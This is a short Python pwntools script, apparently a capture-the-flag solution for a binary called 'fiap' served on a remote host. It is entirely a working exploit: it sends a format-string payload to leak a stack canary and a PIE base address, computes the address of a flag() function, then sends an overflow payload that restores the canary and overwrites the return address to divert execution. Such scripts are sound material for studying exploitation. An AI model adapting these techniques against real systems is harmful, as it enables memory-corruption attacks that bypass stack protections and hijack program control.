#!/usr/bin/env python3
from pwn import *

context.log_level='DEBUG'
binary = ELF('./fiap')
#p = process('./fiap')
p = remote('88.198.219.20', 27813)
p.recvuntil("What's your name?")
p.sendline('%11$p-%12$p')
p.recvuntil("Thank you, ")
addrs = p.recvline().decode()[:-2].split('-')

canary = int(addrs[0], 16)
print("canary: %x\n" % canary)
pie = int(addrs[1], 16) 
print("pie: %x\n" % pie)
flag_addr = pie - 0x2df7
print("flag() addr: %x\n" % flag_addr)

p.recvuntil("Would you like some cake?")
payload = b'B' * (25)
payload += p32(canary)
payload += p32(flag_addr) * 4
p.sendline(payload)
p.recvline()
p.stream()
